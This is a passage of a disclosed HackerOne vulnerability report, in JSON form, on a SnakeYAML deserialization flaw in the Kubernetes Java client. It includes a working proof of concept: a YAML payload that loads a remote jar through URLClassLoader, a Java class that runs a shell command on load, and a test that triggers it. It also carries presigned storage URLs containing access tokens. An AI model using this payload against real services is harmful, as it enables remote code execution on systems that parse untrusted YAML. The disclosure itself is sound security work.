@@ -1,0 +1,709 @@
+{
+  "id": 1807214,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA3MjE0",
+  "url": "https://hackerone.com/reports/1807214",
+  "title": "The `io.kubernetes.client.util.generic.dynamic.Dynamics` contains a code execution vulnerability due to SnakeYAML",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-12-15T19:07:04.306Z",
+  "submitted_at": "2022-12-15T19:07:04.446Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jlleitschuh",
+    "url": "/jlleitschuh",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/cccd3716a6d2e06174d2a41492445cb1d4bf85b4611a755bc810b9246a24d951"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-1471"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-04-25T16:44:21.223Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-04-25T16:44:21.086Z",
+  "team_member_agreed_on_going_public_at": "2023-04-25T13:32:30.161Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nIf the `io.kubernetes.client.util.generic.dynamic.Dynamics` is used to deserialize a `DynamicKubernetesObject `from untrusted YAML, an attacker can achieve code execution inside of the JVM.\n\nSince this is a part of the public API, down stream consumers can be using this API in a way that leaves them vulnerable. I have found no users of this class on GitHub outside of this project's unit tests. But that doesn't mean there are no users of this API. Someone built it for a reason, right?\n\n## Component Version:\n\nKubernettes Java Client version 17.0.0\n\n## Steps To Reproduce:\n\n1. Host a server with a JAR file containing the following code: \n```java\npackage org.jlleitschuh.sandbox;\n\nimport javax.script.ScriptEngine;\nimport javax.script.ScriptEngineFactory;\nimport java.io.IOException;\nimport java.util.List;\n\npublic class ScriptEngineFactoryRCE implements ScriptEngineFactory {\n    static {\n        try {\n            Runtime r = Runtime.getRuntime();\n            Process p = r.exec(\"open -a Calculator\");\n            p.waitFor();\n        } catch (IOException | InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public String getEngineName() {\n        return null;\n    }\n\n    @Override\n    public String getEngineVersion() {\n        return null;\n    }\n\n    @Override\n    public List<String> getExtensions() {\n        return null;\n    }\n\n    @Override\n    public List<String> getMimeTypes() {\n        return null;\n    }\n\n    @Override\n    public List<String> getNames() {\n        return null;\n    }\n\n    @Override\n    public String getLanguageName() {\n        return null;\n    }\n\n    @Override\n    public String getLanguageVersion() {\n        return null;\n    }\n\n    @Override\n    public Object getParameter(String key) {\n        return null;\n    }\n\n    @Override\n    public String getMethodCallSyntax(String obj, String m, String... args) {\n        return null;\n    }\n\n    @Override\n    public String getOutputStatement(String toDisplay) {\n        return null;\n    }\n\n    @Override\n    public String getProgram(String... statements) {\n        return null;\n    }\n\n    @Override\n    public ScriptEngine getScriptEngine() {\n        return null;\n    }\n}\n```\n\nThe jar file must contain a file `/META-INF/services/javax.script.ScriptEngineFactory` with the contents `org.jlleitschuh.sandbox.ScriptEngineFactoryRCE    # Our RCE Payload`\n\nHost this jar file from a local server's root path.\n\nThen call the `Dynamics` yaml parsing APIs with the following payload:\n\n```yaml\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080/\"]]]]\n```\n\n## Fix\n\nThe SnakeYAML parser should be instantiated with the argument `new SafeConstructor()` in order to not be vulnerable to arbitrary deserialization.\n\n## Supporting Material/References:\n - https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in (I'm currently attempting to convince the maintainer of SnakeYaml to make this library secure by default, with limited sucsess)\n - https://nvd.nist.gov/vuln/detail/CVE-2022-1471\n - https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2\n\n## Impact\n\nIf this Dynamics class is used to parse untrusted YAML, an attacker can achieve remote code execution",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2023-05-25T13:32:30.351Z",
+  "allow_singular_disclosure_after": -10430597.179049712,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "awararesearcher",
+    "zy9ard3",
+    "shivammusic",
+    "spetr0x",
+    "paulovictor",
+    "chris15",
+    "bjj",
+    "bublz79",
+    "whitethehack",
+    "agocdg"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 34405,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes-client",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 19619323,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jlleitschuh,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@h1_analyst_oscar",
+      "automated_response": false,
+      "created_at": "2022-12-19T06:03:46.770Z",
+      "updated_at": "2022-12-19T06:03:46.770Z",
+      "actor": {
+        "username": "h1_analyst_oscar",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_oscar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/pu7ypg4n4ur5d2tcr6j69m3jjjb2/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19619339,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hello @jlleitschuh,\n\nThank you for you submission.\nIs the PoC created for a windows machine? If yes, can you please provide steps of the setup?\n\nAlso, a video PoC describing all the exploitation steps would be really helpful in validating your findings.\n\nLooking forward to the additional information.\n\nThanks,\n@h1_analyst_oscar",
+      "automated_response": false,
+      "created_at": "2022-12-19T06:06:49.784Z",
+      "updated_at": "2022-12-19T06:06:49.784Z",
+      "actor": {
+        "username": "h1_analyst_oscar",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_oscar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/pu7ypg4n4ur5d2tcr6j69m3jjjb2/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19683106,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi Oscar,\n\nThe POC is created for MacOS. I'm on vacation until the 28th. Has a maintainer seen this report yet?",
+      "automated_response": false,
+      "created_at": "2022-12-22T15:40:08.008Z",
+      "updated_at": "2022-12-22T15:40:08.008Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19690224,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hello @jlleitschuh,\n\nThe program hasn't viewed the report yet. Can you please provide a video PoC that has all the steps of setup and exploitation for `MacOS`. I understand that you are on vacation right now.\nWhen you are back, please revert on this report with a PoC.\n\nThanks,\n@h1_analyst_oscar",
+      "automated_response": false,
+      "created_at": "2022-12-23T09:43:12.624Z",
+      "updated_at": "2022-12-23T09:43:12.624Z",
+      "actor": {
+        "username": "h1_analyst_oscar",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_oscar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/pu7ypg4n4ur5d2tcr6j69m3jjjb2/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19908914,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "{F2118202}",
+      "automated_response": false,
+      "created_at": "2023-01-12T18:09:07.544Z",
+      "updated_at": "2023-01-12T18:09:07.544Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 2118202,
+          "filename": "SnakeYaml-Kubernetties-Client-RCE-POC.mov",
+          "type": "video/quicktime",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/w6a38gxq2wn91sbnd1m5q5bjnul2?response-content-disposition=attachment%3B%20filename%3D%22SnakeYaml-Kubernetties-Client-RCE-POC.mov%22%3B%20filename%2A%3DUTF-8%27%27SnakeYaml-Kubernetties-Client-RCE-POC.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065547Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a60e971ef649a1e2f9531e2540362c1e3661dba8b0b58d09a2e3d7a03fa97b19"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19908936,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "https://github.com/kubernetes-client/java\n\nThis is the source code of the unit test that I wrote to demonstrate this vulnerability:\n\n```java\n@Test\n  public void testLoadingYamlToDynamicObjRCEPayload() throws IOException {\n    String payload = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\\"http://localhost:8080/code-sandbox.jar\\\"]]]]\";\n    DynamicKubernetesObject obj = Dynamics.newFromYaml(payload);\n  }\n```\n\nI put it inside of `DynamicsTest` as a way of demonstrating the vulnerability is present.\n\n`Dynamics.newFromYaml` as well as other methods on that class are a part of the public API exposed by the package\n\nhttps://github.com/kubernetes-client/java/blob/master/util/src/test/java/io/kubernetes/client/util/generic/dynamic/DynamicsTest.java",
+      "automated_response": false,
+      "created_at": "2023-01-12T18:12:37.191Z",
+      "updated_at": "2023-01-12T18:12:37.191Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19909094,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Just tracked down a real-world instance of a project that you can use to build an example of the payload jar file I demoed.\n\nJust replace the `code-sandbox.jar` with the one you build with this github project, which should be named \"yaml-payload.jar\"\n\nhttps://github.com/artsploit/yaml-payload/tree/master",
+      "automated_response": false,
+      "created_at": "2023-01-12T18:31:30.790Z",
+      "updated_at": "2023-01-12T18:31:30.790Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19909113,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "To further clarify, this is a 6 year old remote code execution vulnerability in SnakeYAML that was originally published in the \"Java Unmarshaller Security: Turning your data into code execution\" research paper published by Moritz Bechler back in 2017.\n\nhttps://github.com/mbechler/marshalsec ",
+      "automated_response": false,
+      "created_at": "2023-01-12T18:34:07.075Z",
+      "updated_at": "2023-01-12T18:34:07.075Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19919670,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hello @jlleitschuh,\n\nThank you for providing the additional details and creating a video PoC. It is really helpful.\nHowever, I am facing an issue upon running the file\n\n{F2119494}\n\nFollowing is the file content (DynamicsTest.java)\n```\n/*\nCopyright 2021 The Kubernetes Authors.\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n*/\npackage io.kubernetes.client.util.generic.dynamic;\n\nimport static org.junit.Assert.*;\n\nimport com.google.gson.JsonObject;\nimport io.kubernetes.client.Resources;\nimport io.kubernetes.client.openapi.JSON;\nimport io.kubernetes.client.util.Yaml;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport org.junit.Test;\n\npublic class DynamicsTest {\n\n  private static final String TEST_POD_YAML_FILE =\n      new File(Resources.getResource(\"test-pod.yaml\").getPath()).toString();\n\n  private static final String TEST_POD_JSON_FILE =\n      new File(Resources.getResource(\"test-pod.json\").getPath()).toString();\n\n  private JSON json = new JSON();\n\n  @Test\n  public void testYamlToJson() throws IOException {\n    String podYamlContent = new String(Files.readAllBytes(Paths.get(TEST_POD_YAML_FILE)));\n    String podJsonContent = new String(Files.readAllBytes(Paths.get(TEST_POD_JSON_FILE)));\n    String convertedJsonContent = Dynamics.fromYamlToJson(podYamlContent);\n\n    assertEquals(\n        json.getGson().fromJson(podJsonContent, JsonObject.class),\n        json.getGson().fromJson(convertedJsonContent, JsonObject.class));\n  }\n\n  @Test\n  public void testJsonToYaml() throws IOException {\n    String podYamlContent = new String(Files.readAllBytes(Paths.get(TEST_POD_YAML_FILE)));\n    String podJsonContent = new String(Files.readAllBytes(Paths.get(TEST_POD_JSON_FILE)));\n    String convertedYamlContent = Dynamics.fromJsonToYaml(podJsonContent);\n\n    assertEquals(Yaml.load(podYamlContent), Yaml.load(convertedYamlContent));\n  }\n\n  @Test\n  public void testLoadingJsonToDynamicObj() throws IOException {\n    String podJsonContent = new String(Files.readAllBytes(Paths.get(TEST_POD_JSON_FILE)));\n    DynamicKubernetesObject obj = Dynamics.newFromJson(podJsonContent);\n\n    assertEquals(obj.getApiVersion(), \"v1\");\n    assertEquals(obj.getKind(), \"Pod\");\n  }\n\n  @Test\n  public void testLoadingYamlToDynamicObj() throws IOException {\n    String podYamlContent = new String(Files.readAllBytes(Paths.get(TEST_POD_YAML_FILE)));\n    DynamicKubernetesObject obj = Dynamics.newFromYaml(podYamlContent);\n\n    assertEquals(obj.getApiVersion(), \"v1\");\n    assertEquals(obj.getKind(), \"Pod\");\n  }\n\n  @Test\n  public void testLoadingYamlToDynamicObjRCEPayload() throws IOException {\n    String payload = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\\"http://localhost:8080/sandbox.jar\\\"]]]]\";\n    DynamicKubernetesObject obj = Dynamics.newFromYaml(payload);\n  }\n}\n\n```\n\nAm I missing anything here in the file?\n\nWe would love to take another look at your report once you have provided additional information supporting your issue.\n\nThanks,\n@h1_analyst_oscar",
+      "automated_response": false,
+      "created_at": "2023-01-13T12:59:42.483Z",
+      "updated_at": "2023-01-13T12:59:42.483Z",
+      "actor": {
+        "username": "h1_analyst_oscar",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_oscar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/pu7ypg4n4ur5d2tcr6j69m3jjjb2/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 2119494,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/enrp9vnmrvv2s43alhegdexp3ahm?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065547Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8b203b37da8371ed603eda2aa085103894e5d1be22b20bd644c9ce4d7ec9296c"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19921927,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hey,\n\n> Thank you for providing the additional details and creating a video PoC. It is really helpful.\nHowever, I am facing an issue upon running the file\n\nThat exception you are getting is an indication that the payload is working as expected and the attacker class is being instantiated.\n\nAt a very high level, the payload:\n```yaml\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080/yaml-payload.jar\"]]]]\n```\n\nIs going to, again very generally and simplified, result in the following java code being executed:\n```java\nnew javax.script.ScriptEngineManager(\n    new java.net.URLClassLoader(\n        new java.net.URL(\n            \"http://localhost:8080/yaml-payload.jar\"\n        )\n    )\n);\n```\n\nThe exception you're seeing is just because the return value of `org.yaml.snakeyaml.Yaml#load` will be an instance of `javax.script.ScriptEngineManager`  not a `Map` like it expects. But regardless of this, it doesn't matter, because the RCE vulnerability happens during the object construction, not later on. So as long as you can force the JVM to invoke the constructor chain listed above, you've achieved RCE.\n\nTL;DR: You've done it right, that exception is meaningless. Check the web server you're running for a GET request.\n\n---\n\nIf you're still having problems with the payload in this repository: https://github.com/artsploit/yaml-payload/tree/master\n\nTry changing these lines:\nhttps://github.com/artsploit/yaml-payload/blob/f4d8cfacc9cae51cb048793dd5a57b0267fbfe1e/src/artsploit/AwesomeScriptEngineFactory.java#L12-L13\n\nThis is the full static block payload that I used in my POC:\n\n```java\nstatic {\n        try {\n            System.out.println(\"Executing payload!\");\n            Runtime r = Runtime.getRuntime();\n            Process p = r.exec(\"open -a Calculator\");\n            p.waitFor();\n        } catch (IOException | InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n```\n",
+      "automated_response": false,
+      "created_at": "2023-01-13T15:54:20.502Z",
+      "updated_at": "2023-01-13T15:54:20.502Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19941926,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jlleitschuh - I'm discussing this submission internally with the Kubernetes team. You will be updated as soon as there is additional information to share. Thanks for your patience!\n\nRegards,\n@h1_analyst_oscar",
+      "automated_response": false,
+      "created_at": "2023-01-16T06:06:50.484Z",
+      "updated_at": "2023-01-16T06:06:50.484Z",
+      "actor": {
+        "username": "h1_analyst_oscar",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_oscar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/pu7ypg4n4ur5d2tcr6j69m3jjjb2/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19966899,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I am currently working with the maintainer of SnakeYAML to make it so that the next release is secure by default. But that hasn't been released yet, so manual configuration changes are still required to make SnakeYAML safe",
+      "automated_response": false,
+      "created_at": "2023-01-17T22:58:08.964Z",
+      "updated_at": "2023-01-17T22:58:08.964Z",
+      "actor": {
+        "username": "jlleitschuh",
+        "cleared": false,
+        "verified": false,
+        "url": "/jlleitschuh",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/388/267/887b2ef55debfc7b243bdf563d314329cf750468_original.JPG/67ff39e4a58539d410215f8dba66a6070ecd205a28d2d3cc89a9223fcfd99d7c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 20147731,
